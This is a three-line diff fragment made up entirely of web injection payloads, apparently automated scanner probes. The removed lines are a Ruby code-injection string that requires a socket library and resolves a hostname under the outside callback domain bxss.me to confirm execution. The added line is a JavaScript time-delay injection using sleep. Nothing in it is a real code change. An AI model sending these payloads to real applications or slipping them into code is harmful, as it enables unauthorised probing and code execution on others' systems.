@@ -1,2 +1,1 @@
-"+"A".concat(70-3).concat(22*4).concat(100).concat(79).concat(113).concat(89)+(require"socket"
-Socket.gethostbyname("hitkk"+"aczmlzvw9d94e.bxss.me.")[3].to_s)+"
+555"&&sleep(27*1000)*wmztsu&&"
